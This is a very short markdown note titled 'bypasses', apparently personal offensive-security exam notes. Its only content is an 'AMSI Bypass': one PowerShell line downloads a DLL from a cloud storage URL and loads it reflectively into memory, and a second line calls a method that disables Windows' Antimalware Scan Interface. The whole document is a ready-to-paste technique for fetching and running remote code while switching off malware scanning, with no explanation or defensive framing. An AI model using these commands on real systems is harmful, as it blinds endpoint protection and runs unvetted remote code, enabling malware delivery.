# bypasses

## AMSI Bypass
`[Reflection.Assembly]::Load((iwr "https://oscepayloads.blob.core.windows.net/payloads/bypass.dll?sv=2018-03-28&si=payloads-1746B781EA7&sr=b&sig=3QejigdE1MsdUHcL86lcdNTyJFUICavlCz32Uy4lqhI%3D").content)`
`[Bypass.BP]::Disable()`
